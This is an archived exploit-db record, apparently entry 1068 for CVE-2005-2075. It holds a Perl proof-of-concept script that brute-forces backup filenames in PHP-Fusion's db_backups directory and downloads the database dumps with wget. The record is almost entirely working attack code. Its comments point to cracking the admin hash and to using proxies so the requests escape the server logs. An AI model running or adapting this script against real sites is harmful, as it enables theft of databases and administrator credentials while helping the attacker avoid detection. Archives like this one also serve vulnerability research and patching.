{
  "id": "1068",
  "title": "PHP-Fusion 6.00.105 - Accessible Database Backups Download",
  "cve": "CVE-2005-2075",
  "vuln_type": "unknown",
  "code": " #!/usr/bin/perl\r\n ######################################################\r\n #  D A R K   A S S A S S I N S   C R E W   2 0 0 5   #\r\n ######################################################\r\n # Dark Assassins - http://dark-assassins.com/        #\r\n # Visit us on IRC @ irc.tddirc.net #DarkAssassins    #\r\n ######################################################\r\n # phpfusiondb.pl; Version 0.1 22/06/05               #\r\n # PHP-Fusion db backup proof-of-concept by Easyex    #\r\n # Database backup vuln in v6.00.105 and below        #\r\n ######################################################\r\n # Description: When a db (database) backup is made   #\r\n # it is saved in /administration/db_backups/ on 6.0  #\r\n # and on 5.0 it is saved in /fusion_admin/db_backups/#\r\n # The backup file can be saved in 2 formats: .sql or #\r\n # .sql.gz and is hidden by a blank index.php file but#\r\n # can be downloaded client-side, The filename is for #\r\n # example : backup_2005-06-22_2208.sql.gz so what we #\r\n # can do is generate 0001 to 9999 and request the    #\r\n # file and download it. If a db file is found an     #\r\n # attacker can get the admin hash and crack  it or   #\r\n # retrieve other sensitive information from the db!  #\r\n ######################################################\r\n\r\n # 9999 requests to the host is alot, And would get noticed in the server log!\r\n # If you re-coded your own script with proxy support you would be fine.\r\n # You need to know the backup year-month-day to be able to find a backup file unless the server is set to automaticlly   \r\n # backup the php-fusiondatabase.\r\n\r\n my $wget='wget';\r\n\r\n my $count='0';\r\n\r\n my $target;\r\n\r\n if (@ARGV < 4)\r\n{\r\n print \"\\n\";\r\n print \"Welcome to the PHP-Fusion db backup vulnerability\\n\";\r\n print \"Coded by Easyex from the Dark Assassins crew\\n\";\r\n print \"\\n\";\r\n print \"Usage: phpfusiondb.pl <host> <version> <file> <extension>\\n\";\r\n print \"Example: phpfusiondb.pl example.com 6 backup_2005-06-23_ .sql.gz\\n\";\r\n print \"\\n\";\r\n exit();\r\n}\r\n\r\n my $host = $ARGV[0];\r\n my $ver = $ARGV[1];\r\n my $file = $ARGV[2];\r\n my $extension = $ARGV[3];\r\n\r\n if ($ver eq \"6\") {\r\n       $dir='/administration/db_backups/'; # Directory path to the 6.X backup folder\r\n }\r\n\r\n if ($ver eq \"5\") {\r\n       $dir='/fusion_admin/db_backups/'; # Directory path to the 5.X backup folder\r\n}\r\n\r\n print \"\\n\";\r\n print \"Welcome to the PHP-Fusion db backup vulnerability\\n\";\r\n print \"Coded by Easyex from the Dark Assassins crew\\n\";\r\n print \"\\n\";\r\n\r\n print \"Host: $host\\n\";\r\n print \"Directory: $dir\\n\";\r\n print \"File: $file + 0001 to 9999\\n\";\r\n print \"Extension: $extension\\n\";\r\n print \"\\n\";\r\n print \"Attempting to find a db backup file on $host\\n\";\r\n\r\n for($count=0;$count<9999;$count++) {\r\n\r\n    $target=$host.$dir.$file.sprintf(\"%04d\", $count).$extension;\r\n\r\n    system(\"$wget $target\");\r\n }\r\n\r\n# milw0rm.com [2005-06-25]",
  "url": "https://www.exploit-db.com/exploits/1068"
}